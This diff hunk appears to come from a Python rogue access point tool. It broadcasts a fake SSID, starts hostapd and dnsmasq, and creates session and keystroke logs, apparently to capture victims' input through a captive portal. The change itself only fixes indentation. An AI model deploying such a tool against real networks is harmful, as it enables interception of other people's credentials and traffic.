@@ -390,7 +390,7 @@ setTimeout(() => {{
     open(session_log, "a").close()
     open(keystroke_log, "a").close()
 
-        print(f"Broadcasting SSID: {fake}")
+    print(f"Broadcasting SSID: {fake}")
     subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])
     time.sleep(2)
     subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
